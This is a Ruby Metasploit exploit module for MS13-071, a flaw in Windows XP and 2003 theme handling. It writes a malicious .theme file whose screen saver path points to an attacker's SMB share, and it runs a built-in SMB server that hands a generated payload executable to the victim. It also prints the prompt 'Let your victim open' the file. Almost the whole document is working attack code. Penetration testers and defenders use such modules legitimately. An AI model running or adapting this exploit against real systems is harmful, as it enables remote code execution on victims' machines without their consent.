##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::EXE
  include Msf::Exploit::Remote::SMBServer

  def initialize(info={})
    super(update_info(info,
      'Name'           => "MS13-071 Microsoft Windows Theme File Handling Arbitrary Code Execution",
      'Description'    => %q{
        This module exploits a vulnerability mainly affecting Microsoft Windows XP and Windows
        2003. The vulnerability exists in the handling of the Screen Saver path, in the [boot]
        section. An arbitrary path can be used as screen saver, including a remote SMB resource,
        which allows for remote code execution when a malicious .theme file is opened, and the
        "Screen Saver" tab is viewed.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Eduardo Prado', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2013-0810'],
          ['OSVDB', '97136'],
          ['MSB', 'MS13-071'],
          ['BID', '62176']
        ],
      'Payload'        =>
        {
          'Space'       => 2048,
          'DisableNops' => true
        },
      'DefaultOptions' =>
        {
          'DisablePayloadHandler' => 'false'
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Windows XP SP3 / Windows 2003 SP2', {}],
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Sep 10 2013",
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('FILENAME', [true, 'The theme file', 'msf.theme']),
          OptString.new('UNCPATH', [ false, 'Override the UNC path to use (Ex: \\\\192.168.1.1\\share\\exploit.scr)' ])
        ], self.class)
  end

  def exploit

    if (datastore['UNCPATH'])
      @unc = datastore['UNCPATH']
      print_status("Remember to share the malicious EXE payload as #{@unc}")
    else
      print_status("Generating our malicious executable...")
      @exe = generate_payload_exe
      my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']
      @share = rand_text_alpha(5 + rand(5))
      @scr_file = "#{rand_text_alpha(5 + rand(5))}.scr"
      @hi, @lo = UTILS.time_unix_to_smb(Time.now.to_i)
      @unc = "\\\\#{my_host}\\#{@share}\\#{@scr_file}"
    end

    print_status("Creating '#{datastore['FILENAME']}' file ...")
    # Default Windows XP / 2003 theme modified
    theme = <<-EOF
; Copyright © Microsoft Corp. 1995-2001

[Theme]
DisplayName=@themeui.dll,-2016

; My Computer
[CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\DefaultIcon]
DefaultValue=%WinDir%explorer.exe,0

; My Documents
[CLSID\\{450D8FBA-AD25-11D0-98A8-0800361B1103}\\DefaultIcon]
DefaultValue=%WinDir%SYSTEM32\\mydocs.dll,0

; My Network Places
[CLSID\\{208D2C60-3AEA-1069-A2D7-08002B30309D}\\DefaultIcon]
DefaultValue=%WinDir%SYSTEM32\\shell32.dll,17

; Recycle Bin
[CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\DefaultIcon]
full=%WinDir%SYSTEM32\\shell32.dll,32
empty=%WinDir%SYSTEM32\\shell32.dll,31

[Control Panel\\Desktop]
Wallpaper=
TileWallpaper=0
WallpaperStyle=2
Pattern=
ScreenSaveActive=0

[boot]
SCRNSAVE.EXE=#{@unc}

[MasterThemeSelector]
MTSM=DABJDKT
    EOF
    file_create(theme)
    print_good("Let your victim open #{datastore['FILENAME']}")

    if not datastore['UNCPATH']
      print_status("Ready to deliver your payload on #{@unc}")
      super
    end

  end

  # TODO: these smb_* methods should be moved up to the SMBServer mixin
  # development and test on progress

  def smb_cmd_dispatch(cmd, c, buff)
    smb = @state[c]
    vprint_status("Received command #{cmd} from #{smb[:name]}")

    pkt = CONST::SMB_BASE_PKT.make_struct
    pkt.from_s(buff)
    #Record the IDs
    smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
    smb[:user_id] = pkt['Payload']['SMB'].v['UserID']
    smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
    smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']

    case cmd
      when CONST::SMB_COM_NEGOTIATE
        smb_cmd_negotiate(c, buff)
      when CONST::SMB_COM_SESSION_SETUP_ANDX
        wordcount = pkt['Payload']['SMB'].v['WordCount']
        if wordcount == 0x0D # It's the case for Share Security Mode sessions
          smb_cmd_session_setup(c, buff)
        else
          vprint_status("SMB Capture - #{smb[:ip]} Unknown SMB_COM_SESSION_SETUP_ANDX request type , ignoring... ")
          smb_error(cmd, c, CONST::SMB_STATUS_SUCCESS)
        end
      when CONST::SMB_COM_TRANSACTION2
        smb_cmd_trans(c, buff)
      when CONST::SMB_COM_NT_CREATE_ANDX
        smb_cmd_create(c, buff)
      when CONST::SMB_COM_READ_ANDX
        smb_cmd_read(c, buff)
      else
        vprint_status("SMB Capture - Ignoring request from #{smb[:name]} - #{smb[:ip]} (#{cmd})")
        smb_error(cmd, c, CONST::SMB_STATUS_SUCCESS)
    end
  end


  def smb_cmd_negotiate(c, buff)
    pkt = CONST::SMB_NEG_PKT.make_struct
    pkt.from_s(buff)

    dialects = pkt['Payload'].v['Payload'].gsub(/\x00/, '').split(/\x02/).grep(/^\w+/)

    dialect = dialects.index("NT LM 0.12") || dialects.length-1

    pkt = CONST::SMB_NEG_RES_NT_PKT.make_struct
    smb_set_defaults(c, pkt)

    time_hi, time_lo = UTILS.time_unix_to_smb(Time.now.to_i)

    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_NEGOTIATE
    pkt['Payload']['SMB'].v['Flags1'] = 0x88
    pkt['Payload']['SMB'].v['Flags2'] = 0xc001
    pkt['Payload']['SMB'].v['WordCount'] = 17
    pkt['Payload'].v['Dialect'] = dialect
    pkt['Payload'].v['SecurityMode'] = 2 # SHARE Security Mode
    pkt['Payload'].v['MaxMPX'] = 50
    pkt['Payload'].v['MaxVCS'] = 1
    pkt['Payload'].v['MaxBuff'] = 4356
    pkt['Payload'].v['MaxRaw'] = 65536
    pkt['Payload'].v['SystemTimeLow'] = time_lo
    pkt['Payload'].v['SystemTimeHigh'] = time_hi
    pkt['Payload'].v['ServerTimeZone'] = 0x0
    pkt['Payload'].v['SessionKey'] = 0
    pkt['Payload'].v['Capabilities'] = 0x80f3fd
    pkt['Payload'].v['KeyLength'] = 8
    pkt['Payload'].v['Payload'] = Rex::Text.rand_text_hex(8)

    c.put(pkt.to_s)
  end

  def smb_cmd_session_setup(c, buff)

    pkt = CONST::SMB_SETUP_RES_PKT.make_struct
    smb_set_defaults(c, pkt)

    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_SESSION_SETUP_ANDX
    pkt['Payload']['SMB'].v['Flags1'] = 0x88
    pkt['Payload']['SMB'].v['Flags2'] = 0xc001
    pkt['Payload']['SMB'].v['WordCount'] = 3
    pkt['Payload'].v['AndX'] = 0x75
    pkt['Payload'].v['Reserved1'] = 00
    pkt['Payload'].v['AndXOffset'] = 96
    pkt['Payload'].v['Action'] = 0x1 # Logged in as Guest
    pkt['Payload'].v['Payload'] =
      Rex::Text.to_unicode("Unix", 'utf-16be') + "\x00\x00" + # Native OS # Samba signature
      Rex::Text.to_unicode("Samba 3.4.7", 'utf-16be') + "\x00\x00" + # Native LAN Manager # Samba signature
      Rex::Text.to_unicode("WORKGROUP", 'utf-16be') + "\x00\x00\x00" + # Primary DOMAIN # Samba signature
    tree_connect_response = ""
    tree_connect_response << [7].pack("C")  # Tree Connect Response : WordCount
    tree_connect_response << [0xff].pack("C") # Tree Connect Response : AndXCommand
    tree_connect_response << [0].pack("C") # Tree Connect Response : Reserved
    tree_connect_response << [0].pack("v")  # Tree Connect Response : AndXOffset
    tree_connect_response << [0x1].pack("v")  # Tree Connect Response : Optional Support
    tree_connect_response << [0xa9].pack("v") # Tree Connect Response : Word Parameter
    tree_connect_response << [0x12].pack("v")  # Tree Connect Response : Word Parameter
    tree_connect_response << [0].pack("v") # Tree Connect Response : Word Parameter
    tree_connect_response << [0].pack("v") # Tree Connect Response : Word Parameter
    tree_connect_response << [13].pack("v") # Tree Connect Response : ByteCount
    tree_connect_response << "A:\x00" # Service
    tree_connect_response << "#{Rex::Text.to_unicode("NTFS")}\x00\x00" # Extra byte parameters
    # Fix the Netbios Session Service Message Length
    # to have into account the tree_connect_response,
    # need to do this because there isn't support for
    # AndX still
    my_pkt = pkt.to_s + tree_connect_response
    original_length = my_pkt[2, 2].unpack("n").first
    original_length = original_length +  tree_connect_response.length
    my_pkt[2, 2] = [original_length].pack("n")
    c.put(my_pkt)
  end

  def smb_cmd_create(c, buff)
    pkt = CONST::SMB_CREATE_PKT.make_struct
    pkt.from_s(buff)

    if pkt['Payload'].v['Payload'] =~ /#{Rex::Text.to_unicode("#{@scr_file}\x00")}/
      pkt = CONST::SMB_CREATE_RES_PKT.make_struct
      smb_set_defaults(c, pkt)
      pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_NT_CREATE_ANDX
      pkt['Payload']['SMB'].v['Flags1'] = 0x88
      pkt['Payload']['SMB'].v['Flags2'] = 0xc001
      pkt['Payload']['SMB'].v['WordCount'] = 42
      pkt['Payload'].v['AndX'] = 0xff # no further commands
      pkt['Payload'].v['OpLock'] = 0x2
      # No need to track fid here, we're just offering one file
      pkt['Payload'].v['FileID'] = rand(0x7fff) + 1 # To avoid fid = 0
      pkt['Payload'].v['Action'] = 0x1 # The file existed and was opened
      pkt['Payload'].v['CreateTimeLow'] = @lo
      pkt['Payload'].v['CreateTimeHigh'] = @hi
      pkt['Payload'].v['AccessTimeLow'] = @lo
      pkt['Payload'].v['AccessTimeHigh'] = @hi
      pkt['Payload'].v['WriteTimeLow'] = @lo
      pkt['Payload'].v['WriteTimeHigh'] = @hi
      pkt['Payload'].v['ChangeTimeLow'] = @lo
      pkt['Payload'].v['ChangeTimeHigh'] = @hi
      pkt['Payload'].v['Attributes'] = 0x80 # Ordinary file
      pkt['Payload'].v['AllocLow'] = 0x100000
      pkt['Payload'].v['AllocHigh'] = 0
      pkt['Payload'].v['EOFLow'] = @exe.length
      pkt['Payload'].v['EOFHigh'] = 0
      pkt['Payload'].v['FileType'] = 0
      pkt['Payload'].v['IPCState'] = 0x7
      pkt['Payload'].v['IsDirectory'] = 0
      c.put(pkt.to_s)
    else
      pkt = CONST::SMB_CREATE_RES_PKT.make_struct
      smb_set_defaults(c, pkt)
      pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_NT_CREATE_ANDX
      pkt['Payload']['SMB'].v['ErrorClass'] = 0xC0000034 # OBJECT_NAME_NOT_FOUND
      pkt['Payload']['SMB'].v['Flags1'] = 0x88
      pkt['Payload']['SMB'].v['Flags2'] = 0xc001
      c.put(pkt.to_s)
    end

  end

  def smb_cmd_read(c, buff)
    pkt = CONST::SMB_READ_PKT.make_struct
    pkt.from_s(buff)

    offset = pkt['Payload'].v['Offset']
    length = pkt['Payload'].v['MaxCountLow']

    pkt = CONST::SMB_READ_RES_PKT.make_struct
    smb_set_defaults(c, pkt)

    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_READ_ANDX
    pkt['Payload']['SMB'].v['Flags1'] = 0x88
    pkt['Payload']['SMB'].v['Flags2'] = 0xc001
    pkt['Payload']['SMB'].v['WordCount'] = 12
    pkt['Payload'].v['AndX'] = 0xff # no more commands
    pkt['Payload'].v['Remaining'] = 0xffff
    pkt['Payload'].v['DataLenLow'] = length
    pkt['Payload'].v['DataOffset'] = 59
    pkt['Payload'].v['DataLenHigh'] = 0
    pkt['Payload'].v['Reserved3'] = 0
    pkt['Payload'].v['Reserved4'] = 6
    pkt['Payload'].v['ByteCount'] = length
    pkt['Payload'].v['Payload'] = @exe[offset, length]

    c.put(pkt.to_s)
  end

  def smb_cmd_trans(c, buff)
    pkt = CONST::SMB_TRANS2_PKT.make_struct
    pkt.from_s(buff)

    sub_command = pkt['Payload'].v['SetupData'].unpack("v").first
    case sub_command
      when 0x5 # QUERY_PATH_INFO
        smb_cmd_trans_query_path_info(c, buff)
      when 0x1 # FIND_FIRST2
        smb_cmd_trans_find_first2(c, buff)
      else
        pkt = CONST::SMB_TRANS_RES_PKT.make_struct
        smb_set_defaults(c, pkt)
        pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_TRANSACTION2
        pkt['Payload']['SMB'].v['Flags1'] = 0x88
        pkt['Payload']['SMB'].v['Flags2'] = 0xc001
        pkt['Payload']['SMB'].v['ErrorClass'] = 0xc0000225 # NT_STATUS_NOT_FOUND
        c.put(pkt.to_s)
    end
  end

  def smb_cmd_trans_query_path_info(c, buff)
    pkt = CONST::SMB_TRANS2_PKT.make_struct
    pkt.from_s(buff)

    if pkt['Payload'].v['SetupData'].length < 16
      # if QUERY_PATH_INFO_PARAMETERS doesn't include a file name,
      # return a Directory answer
      pkt = CONST::SMB_TRANS_RES_PKT.make_struct
      smb_set_defaults(c, pkt)

      pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_TRANSACTION2
      pkt['Payload']['SMB'].v['Flags1'] = 0x88
      pkt['Payload']['SMB'].v['Flags2'] = 0xc001
      pkt['Payload']['SMB'].v['WordCount'] = 10
      pkt['Payload'].v['ParamCountTotal'] = 2
      pkt['Payload'].v['DataCountTotal'] = 40
      pkt['Payload'].v['ParamCount'] = 2
      pkt['Payload'].v['ParamOffset'] = 56
      pkt['Payload'].v['DataCount'] = 40
      pkt['Payload'].v['DataOffset'] = 60
      pkt['Payload'].v['Payload'] =
        "\x00" + # Padding
        # QUERY_PATH_INFO Parameters
        "\x00\x00" + # EA Error Offset
        "\x00\x00" + # Padding
        #QUERY_PATH_INFO Data
        [@lo, @hi].pack("VV") + # Created
        [@lo, @hi].pack("VV") + # Last Access
        [@lo, @hi].pack("VV") + # Last Write
        [@lo, @hi].pack("VV") + # Change
        "\x10\x00\x00\x00" + # File attributes => directory
        "\x00\x00\x00\x00" # Unknown
      c.put(pkt.to_s)

    else
      # if QUERY_PATH_INFO_PARAMETERS includes a file name,
      # returns an object name not found error
      pkt = CONST::SMB_TRANS_RES_PKT.make_struct
      smb_set_defaults(c, pkt)

      pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_TRANSACTION2
      pkt['Payload']['SMB'].v['ErrorClass'] = 0xC0000034 #OBJECT_NAME_NOT_FOUND
      pkt['Payload']['SMB'].v['Flags1'] = 0x88
      pkt['Payload']['SMB'].v['Flags2'] = 0xc001
      c.put(pkt.to_s)

    end
  end

  def smb_cmd_trans_find_first2(c, buff)

    pkt = CONST::SMB_TRANS_RES_PKT.make_struct
    smb_set_defaults(c, pkt)

    file_name = Rex::Text.to_unicode(@scr_file)

    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_TRANSACTION2
    pkt['Payload']['SMB'].v['Flags1'] = 0x88
    pkt['Payload']['SMB'].v['Flags2'] = 0xc001
    pkt['Payload']['SMB'].v['WordCount'] = 10
    pkt['Payload'].v['ParamCountTotal'] = 10
    pkt['Payload'].v['DataCountTotal'] = 94 + file_name.length
    pkt['Payload'].v['ParamCount'] = 10
    pkt['Payload'].v['ParamOffset'] = 56
    pkt['Payload'].v['DataCount'] = 94 + file_name.length
    pkt['Payload'].v['DataOffset'] = 68
    pkt['Payload'].v['Payload'] =
      "\x00" + # Padding
      # FIND_FIRST2 Parameters
      "\xfd\xff" + # Search ID
      "\x01\x00" + # Search count
      "\x01\x00" + # End Of Search
      "\x00\x00" + # EA Error Offset
      "\x00\x00" + # Last Name Offset
      "\x00\x00" + # Padding
      #QUERY_PATH_INFO Data
      [94 + file_name.length].pack("V") + # Next Entry Offset
      "\x00\x00\x00\x00" + # File Index
      [@lo, @hi].pack("VV") + # Created
      [@lo, @hi].pack("VV") + # Last Access
      [@lo, @hi].pack("VV") + # Last Write
      [@lo, @hi].pack("VV") + # Change
      [@exe.length].pack("V") + "\x00\x00\x00\x00" + # End Of File
      "\x00\x00\x10\x00\x00\x00\x00\x00" + # Allocation size
      "\x80\x00\x00\x00" + # File attributes => directory
      [file_name.length].pack("V") + # File name len
      "\x00\x00\x00\x00" + # EA List Lenght
      "\x00" + # Short file lenght
      "\x00" + # Reserved
      ("\x00" * 24) +
      file_name

    c.put(pkt.to_s)
  end

end
